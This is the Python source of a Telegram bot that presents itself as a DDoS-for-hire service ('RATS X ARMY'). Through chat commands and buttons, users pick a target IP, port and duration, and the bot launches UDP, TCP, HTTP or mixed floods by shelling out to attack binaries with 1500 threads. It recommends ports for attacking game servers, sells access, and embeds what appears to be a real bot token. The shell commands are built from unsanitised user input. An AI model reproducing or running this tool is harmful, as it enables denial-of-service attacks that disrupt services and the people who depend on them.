#!/usr/bin/env python3
"""
🔥 RATS X ARMY - ULTIMATE DDOS BOT 🔥
Supports: UDP, TCP, HTTP, ICMP Flood Methods
"""

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import subprocess
import os
import time
import threading
import json
import re
from datetime import datetime
import requests

# ==================== CONFIG ====================
BOT_TOKEN = "8386508236:AAH_kO43h4ABGh4IM16YjzZeAUOKg-WGEv0"
ADMIN_ID = ["1434287051"]
OWNER_USERNAME = "@ITS_BFC"

# Files
USER_FILE = "primex_users.json"
LOG_FILE = "attack_logs.txt"

# Attack settings
MAX_DURATION = 180
MIN_DURATION = 10
COOLDOWN_TIME = 25
DEFAULT_THREADS = 1500

# Attack methods
ATTACK_METHODS = {
    "udp": {"name": "UDP Flood", "cmd": "./leak", "best": "Gaming, VPN, DNS"},
    "tcp": {"name": "TCP Flood", "cmd": "./tcp_leak", "best": "Web, SSH, FTP"},
    "http": {"name": "HTTP Flood", "cmd": "./http_leak", "best": "Websites, APIs"},
    "mixed": {"name": "Mixed Flood", "cmd": "./leak", "best": "All purpose"}
}

# BGMI optimized ports
BGMI_PORTS = [443, 8080, 14000, 27015, 27016, 27017, 27018, 27019, 27020]

# ==================== DATA STORAGE ====================
def load_data():
    try:
        with open(USER_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"users": [ADMIN_ID[0]], "stats": {}, "cooldown": {}}

def save_data(data):
    with open(USER_FILE, 'w') as f:
        json.dump(data, f, indent=2)

data = load_data()
users = data.get("users", [ADMIN_ID[0]])
stats = data.get("stats", {})
cooldown_data = data.get("cooldown", {})

# ==================== BOT INIT ====================
bot = telebot.TeleBot(BOT_TOKEN)
active_attacks = {}
attack_lock = threading.Lock()

# ==================== HELPER FUNCTIONS ====================
def is_admin(user_id):
    return str(user_id) in ADMIN_ID or str(user_id) in users

def update_stats(user_id, method, duration):
    uid = str(user_id)
    if uid not in stats:
        stats[uid] = {"total": 0, "today": 0, "last_reset": datetime.now().strftime("%Y-%m-%d")}
    
    if stats[uid]["last_reset"] != datetime.now().strftime("%Y-%m-%d"):
        stats[uid]["today"] = 0
        stats[uid]["last_reset"] = datetime.now().strftime("%Y-%m-%d")
    
    stats[uid]["total"] += 1
    stats[uid]["today"] += 1
    
    data["stats"] = stats
    save_data(data)

def log_attack(user_id, target, port, duration, method):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} | {user_id} | {target}:{port} | {duration}s | {method}\n")

def check_cooldown(user_id):
    uid = str(user_id)
    if uid in cooldown_data:
        last = cooldown_data[uid]
        remaining = COOLDOWN_TIME - (time.time() - last)
        if remaining > 0:
            return int(remaining)
    return 0

def set_cooldown(user_id):
    cooldown_data[str(user_id)] = time.time()
    data["cooldown"] = cooldown_data
    save_data(data)

def validate_ip(ip):
    pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if pattern.match(ip):
        parts = ip.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

# ==================== KEYBOARDS ====================
def main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("🚀 UDP FLOOD", callback_data="method_udp"),
        InlineKeyboardButton("🌐 TCP FLOOD", callback_data="method_tcp"),
        InlineKeyboardButton("💻 HTTP FLOOD", callback_data="method_http"),
        InlineKeyboardButton("⚡ MIXED", callback_data="method_mixed"),
        InlineKeyboardButton("📊 MY STATS", callback_data="stats"),
        InlineKeyboardButton("👤 PROFILE", callback_data="profile"),
        InlineKeyboardButton("💰 BGMI PORTS", callback_data="bgmi_ports"),
        InlineKeyboardButton("❓ HELP", callback_data="help")
    ]
    
    if str(user_id) in ADMIN_ID:
        buttons.append(InlineKeyboardButton("🔐 ADMIN", callback_data="admin"))
    
    markup.add(*buttons)
    return markup

def admin_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("👥 ALL USERS", callback_data="admin_users"),
        InlineKeyboardButton("➕ ADD USER", callback_data="admin_add"),
        InlineKeyboardButton("❌ REMOVE USER", callback_data="admin_remove"),
        InlineKeyboardButton("📊 STATS", callback_data="admin_stats"),
        InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast"),
        InlineKeyboardButton("🔙 BACK", callback_data="back")
    )
    return markup

def duration_menu(method, target, port):
    markup = InlineKeyboardMarkup(row_width=3)
    buttons = [
        InlineKeyboardButton("30s", callback_data=f"dur_{method}_{target}_{port}_30"),
        InlineKeyboardButton("60s", callback_data=f"dur_{method}_{target}_{port}_60"),
        InlineKeyboardButton("90s", callback_data=f"dur_{method}_{target}_{port}_90"),
        InlineKeyboardButton("120s", callback_data=f"dur_{method}_{target}_{port}_120"),
        InlineKeyboardButton("180s", callback_data=f"dur_{method}_{target}_{port}_180"),
        InlineKeyboardButton("🔙 BACK", callback_data="back_attack")
    ]
    markup.add(*buttons)
    return markup

# ==================== COMMAND HANDLERS ====================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    username = message.from_user.first_name
    
    welcome = f"""
╔══════════════════════════════════════╗
║     🔥 RATS X ARMY BOT 🔥          ║
║     @ITS_BFC                    ║
╠══════════════════════════════════════╣
║  👤 Welcome, {username}!             
║  ⚡ Status: {'✅ PREMIUM' if is_admin(user_id) else '✅ USER'}
║  🛡️ Methods: UDP | TCP | HTTP | Mixed
║  ⏱️ Max Duration: {MAX_DURATION}s
║  🔧 Cooldown: {COOLDOWN_TIME}s
╠══════════════════════════════════════╣
║  Use buttons below to attack!        ║
╚══════════════════════════════════════╝
"""
    bot.reply_to(message, welcome, parse_mode="Markdown", reply_markup=main_menu(user_id))

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ You are not authorized! Contact @ITS_BFC")
        return
    
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, 
            "⚡ USAGE:\n"
            "/attack <IP> <PORT> <TIME> [METHOD]\n\n"
            "Examples:\n"
            "/attack 1.1.1.1 443 60 udp\n"
            "/attack 1.1.1.1 80 45 tcp\n"
            "/attack example.com 80 30 http\n\n"
            "Methods: udp, tcp, http, mixed")
        return
    
    target = args[1]
    port = args[2]
    duration = args[3]
    method = args[4].lower() if len(args) > 4 else "udp"
    
    # Validate
    if not validate_ip(target) and not target.replace('.', '').isdigit():
        bot.reply_to(message, "❌ Invalid IP address!")
        return
    
    try:
        port = int(port)
        duration = int(duration)
        if duration < MIN_DURATION or duration > MAX_DURATION:
            bot.reply_to(message, f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            return
    except:
        bot.reply_to(message, "❌ Invalid port or duration!")
        return
    
    cooldown = check_cooldown(user_id)
    if cooldown > 0:
        bot.reply_to(message, f"⏳ Wait {cooldown} seconds before next attack!")
        return
    
    set_cooldown(user_id)
    update_stats(user_id, method, duration)
    log_attack(user_id, target, port, duration, method)
    
    msg = bot.reply_to(message, 
        f"🔥 ATTACK LAUNCHED!\n\n"
        f"🎯 Target: {target}:{port}\n"
        f"⚡ Method: {ATTACK_METHODS.get(method, ATTACK_METHODS['udp'])['name']}\n"
        f"⏱️ Duration: {duration}s\n"
        f"🔧 Threads: {DEFAULT_THREADS}\n\n"
        f"💥 Attack in progress...")
    
    def run_attack():
        cmd = f"{ATTACK_METHODS.get(method, ATTACK_METHODS['udp'])['cmd']} {target} {port} {duration} {DEFAULT_THREADS}"
        subprocess.run(cmd, shell=True)
        bot.edit_message_text(
            f"✅ ATTACK COMPLETE!\n\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Duration: {duration}s\n"
            f"📊 Check /stats for your usage",
            message.chat.id, msg.message_id)
    
    threading.Thread(target=run_attack).start()

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    user_id = str(message.from_user.id)
    user_stats = stats.get(user_id, {"total": 0, "today": 0})
    
    msg = f"""
📊 YOUR ATTACK STATS

╔════════════════════════════╗
║  Total Attacks: {user_stats['total']}    
║  Today: {user_stats['today']}         
║  Cooldown: {COOLDOWN_TIME}s      
╚════════════════════════════╝
"""
    bot.reply_to(message, msg)

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    data = call.data
    
    if data.startswith("method_"):
        method = data.replace("method_", "")
        bot.send_message(call.message.chat.id, 
            f"⚡ Selected: {ATTACK_METHODS.get(method, ATTACK_METHODS['udp'])['name']}\n\n"
            f"Send target IP and port:\n"
            f"Example: `1.1.1.1 443`\n\n"
            f"Or use: /attack IP PORT TIME {method}",
            parse_mode="Markdown")
        bot.register_next_step_handler(call.message, get_target_port, method)
        bot.answer_callback_query(call.id)
    
    elif data == "bgmi_ports":
        ports = "\n".join([f"🔹 {p}" for p in BGMI_PORTS])
        bot.send_message(call.message.chat.id,
            f"🎯 BEST BGMI PORTS:\n\n{ports}\n\n"
            f"Recommended: 14000, 27015-27020\n"
            f"Usage: /attack IP PORT TIME udp")
        bot.answer_callback_query(call.id)
    
    elif data == "stats":
        uid = str(user_id)
        user_stats = stats.get(uid, {"total": 0, "today": 0})
        bot.edit_message_text(
            f"📊 STATS\n\nTotal: {user_stats['total']}\nToday: {user_stats['today']}",
            call.message.chat.id, call.message.message_id, reply_markup=main_menu(user_id))
        bot.answer_callback_query(call.id)
    
    elif data == "profile":
        uid = str(user_id)
        role = "ADMIN" if uid in ADMIN_ID else "USER"
        user_stats = stats.get(uid, {"total": 0, "today": 0})
        bot.edit_message_text(
            f"👤 PROFILE\n\n"
            f"ID: {user_id}\n"
            f"Role: {role}\n"
            f"Total Attacks: {user_stats['total']}\n"
            f"Today: {user_stats['today']}\n"
            f"Cooldown: {COOLDOWN_TIME}s",
            call.message.chat.id, call.message.message_id, reply_markup=main_menu(user_id))
        bot.answer_callback_query(call.id)
    
    elif data == "help":
        help_text = """
🔥 RATS X ARMY BOT HELP

COMMANDS:
/start - Start bot
/attack IP PORT TIME METHOD - Launch attack
/stats - Your stats
/profile - Your profile

METHODS:
udp - UDP Flood (Gaming)
tcp - TCP Flood (Web)
http - HTTP Flood (Websites)
mixed - Mixed packets

BGMI PORTS:
14000, 27015-27020, 443, 8080

Buy Access: @ITS_BFC
"""
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=main_menu(user_id))
        bot.answer_callback_query(call.id)
    
    elif data == "admin" and str(user_id) in ADMIN_ID:
        bot.edit_message_text("🔐 ADMIN PANEL", call.message.chat.id, call.message.message_id, reply_markup=admin_menu())
        bot.answer_callback_query(call.id)
    
    elif data == "back":
        bot.edit_message_text("🔥 RATS X ARMY", call.message.chat.id, call.message.message_id, reply_markup=main_menu(user_id))
        bot.answer_callback_query(call.id)

def get_target_port(message, method):
    user_id = message.from_user.id
    try:
        target, port = message.text.split()
        bot.send_message(message.chat.id, f"✅ Target: {target}:{port}\n\nSend duration (10-180 seconds):")
        bot.register_next_step_handler(message, get_duration, method, target, port)
    except:
        bot.send_message(message.chat.id, "❌ Invalid! Use: IP PORT\nExample: 1.1.1.1 443")

def get_duration(message, method, target, port):
    user_id = message.from_user.id
    try:
        duration = int(message.text.strip())
        if duration < MIN_DURATION or duration > MAX_DURATION:
            bot.send_message(message.chat.id, f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            return
        
        cooldown = check_cooldown(user_id)
        if cooldown > 0:
            bot.send_message(message.chat.id, f"⏳ Wait {cooldown}s!")
            return
        
        set_cooldown(user_id)
        update_stats(user_id, method, duration)
        log_attack(user_id, target, port, duration, method)
        
        msg = bot.send_message(message.chat.id, 
            f"🔥 ATTACK LAUNCHED!\n🎯 {target}:{port}\n⏱️ {duration}s\n⚡ {ATTACK_METHODS.get(method, ATTACK_METHODS['udp'])['name']}")
        
        def run():
            cmd = f"{ATTACK_METHODS.get(method, ATTACK_METHODS['udp'])['cmd']} {target} {port} {duration} {DEFAULT_THREADS}"
            subprocess.run(cmd, shell=True)
            bot.edit_message_text(f"✅ Attack complete on {target}:{port}", message.chat.id, msg.message_id)
        
        threading.Thread(target=run).start()
        
    except:
        bot.send_message(message.chat.id, "❌ Invalid duration!")

# ==================== ADMIN COMMANDS ====================
@bot.message_handler(commands=['add'])
def add_user_cmd(message):
    if str(message.from_user.id) not in ADMIN_ID:
        bot.reply_to(message, "❌ Admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /add USER_ID")
        return
    
    new_user = args[1]
    if new_user not in users:
        users.append(new_user)
        data["users"] = users
        save_data(data)
        bot.reply_to(message, f"✅ User {new_user} added!")
    else:
        bot.reply_to(message, "User already exists!")

@bot.message_handler(commands=['remove'])
def remove_user_cmd(message):
    if str(message.from_user.id) not in ADMIN_ID:
        bot.reply_to(message, "❌ Admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /remove USER_ID")
        return
    
    rem_user = args[1]
    if rem_user in users and rem_user not in ADMIN_ID:
        users.remove(rem_user)
        data["users"] = users
        save_data(data)
        bot.reply_to(message, f"✅ User {rem_user} removed!")
    else:
        bot.reply_to(message, "User not found or cannot remove admin!")

@bot.message_handler(commands=['allusers'])
def all_users_cmd(message):
    if str(message.from_user.id) not in ADMIN_ID:
        bot.reply_to(message, "❌ Admin only!")
        return
    
    user_list = "\n".join([f"👤 {u}" for u in users])
    bot.reply_to(message, f"📋 AUTHORIZED USERS:\n\n{user_list}\n\nTotal: {len(users)}")

# ==================== MAIN ====================
def check_binaries():
    """Check if attack binaries exist"""
    binaries = ["./leak", "./tcp_leak", "./http_leak"]
    missing = []
    for binary in binaries:
        if not os.path.exists(binary):
            missing.append(binary)
    
    if missing:
        print("⚠️ Missing binaries:", missing)
        print("Run: gcc -o leak leak.c -lpthread -O3")
        print("     gcc -o tcp_leak tcp_leak.c -lpthread")
        print("     gcc -o http_leak http_leak.c -lpthread")

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║        🔥 RATS X ARMY ULTIMATE DDOS BOT 🔥              ║
║                     @ITS_BFC                         ║
║                                                            ║
╠════════════════════════════════════════════════════════════╣
║  ✅ Bot Token: Loaded                                      ║
║  ✅ Admin: 1434287051                                      ║
║  ✅ Methods: UDP | TCP | HTTP | Mixed                     ║
║  ✅ Status: ONLINE                                         ║
╚════════════════════════════════════════════════════════════╝
    """)
    
    check_binaries()
    bot.infinity_polling()